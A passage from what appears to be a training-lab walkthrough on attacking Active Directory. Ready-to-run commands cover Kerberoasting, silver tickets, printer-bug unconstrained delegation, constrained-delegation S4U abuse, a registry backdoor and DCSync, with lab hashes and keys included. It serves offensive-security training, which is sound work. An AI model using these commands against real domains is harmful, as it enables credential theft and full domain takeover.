</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="p">{</span><span class="n">whoami</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="n">dcorpdc.dollarcorp.moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><p>To retrieve machine account hash without DA, first we need to modify permissions on the DC by running this command as DA:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\RACE.ps1</span><span class="w">

 </span><span class="n">Add-RemoteRegBackdoor</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorpdc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Trustee</span><span class="w"> </span><span class="nx">student520</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>Then we can retrieve the hash as the student520 user with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\RACE.ps1</span><span class="w">

</span><span class="n">Get-RemoteMachineAccountHash</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>The machine account hash can be used to create silver tickets for HOST and RPCSS to execute WMI queries:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"



C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:1be12164a06b817e834eb437dc8f581c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
</pre></table></code></div></div><p>then</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="n">gwmi</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-14"><span class="mr-2">Learning Objective 14</span><a href="#learning-objective-14" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>the task in this objective is using Kerberoasting, get and crack the password of the SQL server service account.</p><p>We can use PowerView’s <code class="language-plaintext highlighter-rouge">Get-DomainUser -SPN</code> or AD module for discovering services running with user accounts, as services running with machine accounts have difficult passwords.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">

</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w">
</span></pre></table></code></div></div><p>Which shows in this lab that the svcadmin, who is a DA, has an SPN set which we can kerberoast with rubeus. Note we are using the /rc4opsec option which will only retrieve hashes for accounts that support rc4, if the account supports kerberos AES 128/256 bit encrption, the below command will not request its hashes.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/user:svcadmin</span><span class="w"> </span><span class="nx">/simple</span><span class="w"> </span><span class="nx">/rc4opsec</span><span class="w"> </span><span class="nx">/outfile:C:\AD\Tools\hashes.txt</span><span class="w">
</span></pre></table></code></div></div><p>Then you need to remove :1433 from the SPN in hashes.txt (output file of previous command) before running john, then run the below command to crack it.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="n">C:\AD\Tools\kerberoast\10k-worst-pass.txt</span><span class="w"> </span><span class="nx">C:\AD\Tools\hashes.txt</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-15"><span class="mr-2">Learning Objective 15</span><a href="#learning-objective-15" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Objectives: find a server in the dcorp domain where unconstrained delegation is enabled, comrpromise the server and escalate to DA, escalate to EA by abusing the printer bug.</p><p>First we will need to find a server that has unconstrained delegation enabled</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">

</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-Unconstrained</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span></pre></table></code></div></div><p>Since the prerequiside for elevation using unconstrained delegation is having admin access to the machine, we need to compromise a user who has local admin access on appsrv. Recall that we extracted the secrets of appadmin, srvadmin, and websvc from dcorp-adminsrv. Let’s check if any of them have local admin on dcorp-appsrv. Run the below command from an elevated command prompt:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit
</span></pre></table></code></div></div><p>Then run the below commands in the new process:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">

</span><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">

</span><span class="n">Find-PSRemotingLocalAdminAccess</span><span class="w">
</span></pre></table></code></div></div><p>And we can see that we have remote local admin access on dcorp-appsrv and dcorp-adminsrv with the appadmin user. We can copy rubeus to the dcorp-appsrv to abuse the printer bug. Run the below from the process running as appadmin:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">\\dcorp-appsrv\C</span><span class="err">$</span><span class="nx">\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span></pre></table></code></div></div><p>Then run rubeus in Listener mode</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-appsrv</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/targetuser:DCORP-DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></pre></table></code></div></div><p>On our student VM, use MS-RPRN to force authentication from the dc</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\MS-RPRN.exe</span><span class="w"> </span><span class="nx">\\dcorp-dc.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">\\dcorp-appsrv.dollarcorp.moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><p>On the Rubeus listener, you should see the TGT of dcorp-dc$. Copy the base64 encoded ticket and use it with rubeus on the studentvm, run the below command from an elevated shell as the safetykatz command we will use requires elevation.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:doIFx</span><span class="err">…</span><span class="w">
</span></pre></table></code></div></div><p>Now we can run DCSync from this process:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:dcorp\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><h4 id="escalation-to-enterprise-admin"><span class="mr-2">Escalation to Enterprise Admin</span><a href="#escalation-to-enterprise-admin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To get EA privileges, we need to force authentication from mcorp-dc. Run the below command to listen for mcorp-dc$ tickets on the dcorp-appsrv</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-appsrv</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">monitor</span><span class="w"> </span><span class="nx">/targetuser:MCORP-DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/interval:5</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></pre></table></code></div></div><p>Then use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\MS-RPRN.exe</span><span class="w"> </span><span class="nx">\\mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">\\dcorpappsrv.dollarcorp.moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><p>As previously, copy the base64 encoded ticket and use it with Rubeus on the student VM in an elevated shell.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:doIFx...</span><span class="w">
</span></pre></table></code></div></div><p>Now we can run DCSync from the process with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>And we can escalate to EA!</p><h3 id="learning-objective-16"><span class="mr-2">Learning Objective 16</span><a href="#learning-objective-16" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this objective we will be enumerating users in the domain for whom <code class="language-plaintext highlighter-rouge">constrained delegation</code> is enabled, and for such a user we will request a TGT from the DC and obtain a TGS for the service to which delegation is configured, then we will pass the ticket and access the service. In this objective we will also enumerate computer accounts for which <code class="language-plaintext highlighter-rouge">constrained delegation</code> is enabled, and request a TGT from the DC, and use the TGS for LDAP service on the target machine, then use the TGS to execute dcsync attack.</p><p>To enumerate users with constrained delegation, we can use PowerView, Run the below commands to get started after loading a shell with invisishell:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">

</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-TrustedToAuth</span><span class="w">
</span></pre></table></code></div></div><p>Since we already have the secrets for websvc from the dcorp-adminsrv machine, we can use kekeo or rubeus to abuse that as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:websvc</span><span class="w">
</span><span class="n">/aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/msdsspn:</span><span class="s2">"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL"</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>This command requests a TGS for websvc as the DA, then the TGS is used to access the service specified in the /msdsspn parameter (CIFS/dcorpmssql is the filesystem on the dcorp-mssql machine)</p><p>Check the ticket with <code class="language-plaintext highlighter-rouge">klist</code>, and you should see Client: Administrator @ dollarcorp.moneycorp.local. If so, try accessing the filesystem on dcorp-mssql with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dir</span><span class="w"> </span><span class="nx">\\dcorp-mssql.dollarcorp.moneycorp.local\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h4 id="abusing-constrained-delegation-with-kekeo"><span class="mr-2">Abusing Constrained Delegation with Kekeo</span><a href="#abusing-constrained-delegation-with-kekeo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Go into the x64 keko directory, and we wil use the tgt::ask module from kekeo to request a TGT from websvc, we are using the NTLM hash just to show that NTLM can be used as well.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools\kekeo\x64</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\kekeo.exe</span><span class="w">

</span><span class="n">tgt::ask</span><span class="w"> </span><span class="nx">/user:websvc</span><span class="w"> </span><span class="nx">/domain:dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/rc4:cc098f204c5887eaa8253e7c2749156f</span><span class="w">
</span></pre></table></code></div></div><p>Now let’s get this TGT and request a TGS, note that we are requesting a TGS to access cifs/dcorp-mssql as the domain administrator.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">tgs::s4u</span><span class="w"> </span><span class="nx">/tgt:TGT_websvc</span><span class="err">@</span><span class="nx">DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local</span><span class="err">@</span><span class="nx">DOLLARCORP.MONEYCORP.LOCAL.kirbi</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="err">@</span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL</span><span class="w">
</span></pre></table></code></div></div><p>You should see</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>&gt; Ticket in file
'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs
~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
</pre></table></code></div></div><p>Next, inject the ticket in the current session to use it as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w">

</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><p>Then use the below command to view the contents of the fileshare on dcorp-mssql</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dir</span><span class="w"> </span><span class="nx">\\dcorp-mssql.dollarcorp.moneycorp.local\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h4 id="enumerating-computer-accounts-with-constrained-delegation-enabled-using-powerview"><span class="mr-2">Enumerating computer accounts with constrained delegation enabled using powerview</span><a href="#enumerating-computer-accounts-with-constrained-delegation-enabled-using-powerview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-TrustedtoAuth</span><span class="w">
</span></pre></table></code></div></div><p>Run the below command with the AES key of dcorp-adminsrv from an elevated command prompt.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:dcorp-adminsrv</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w">  </span><span class="nx">/msdsspn:time/dcorpdc.dollarcorp.moneycorp.LOCAL</span><span class="w"> </span><span class="nx">/altservice:ldap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then run the below command to abuse the LDAP ticket</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:dcorp\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><h4 id="abusing-constraied-delegation-for-machine-accounts-using-kekeo"><span class="mr-2">Abusing Constraied Delegation for Machine Accounts using Kekeo</span><a href="#abusing-constraied-delegation-for-machine-accounts-using-kekeo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\kekeo.exe</span><span class="w">

</span><span class="n">tgt::ask</span><span class="w"> </span><span class="nx">/user:dcorp-adminsrv</span><span class="err">$</span><span class="w"> </span><span class="nx">/domain:dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/rc4:8c6264140d5ae7d03f7f2a53088a291d</span><span class="w">
</span></pre></table></code></div></div><p>Since there is no $NAME validation, we can request TGS for time and also LDAP service on dcorp-dc as domain administrator as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">tgs::s4u</span><span class="w"> </span><span class="nx">/tgt:TGT_dcorpadminsrv</span><span class="err">$@</span><span class="nx">DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local</span><span class="err">@</span><span class="nx">DOLLARCORP.MONEYCORP.LOCAL.kirbi</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="err">@</span><span class="nx">dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nx">/service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL</span><span class="o">|</span><span class="n">ldap/dcorpdc.dollarcorp.moneycorp.LOCAL</span><span class="w">
</span></pre></table></code></div></div><p>Then we can use the LDAP ticket as such:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">Invoke-Mimi.ps1</span><span class="w">

</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><p>Now using this TGS, we can run DCSync from Mimikatz without DA privileges:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
